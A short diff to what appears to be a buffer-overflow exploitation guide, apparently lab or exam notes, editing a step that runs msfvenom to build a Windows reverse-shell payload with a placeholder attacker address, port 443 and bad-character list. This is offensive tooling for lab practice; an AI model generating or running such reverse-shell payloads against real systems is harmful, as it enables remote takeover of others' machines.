@@ -148,7 +148,10 @@ vim exploit.py # RETN: "???"
 
 USE YOUR IP ADDRESS FOR THE LHOST!
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=??? LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b "???"
+ip address
+LHOST=10.10.10.69 # change me
+BADCHARS="\x04\x03\x02\x01" # change me
+msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b $BADCHARS
 
 # output
 ```
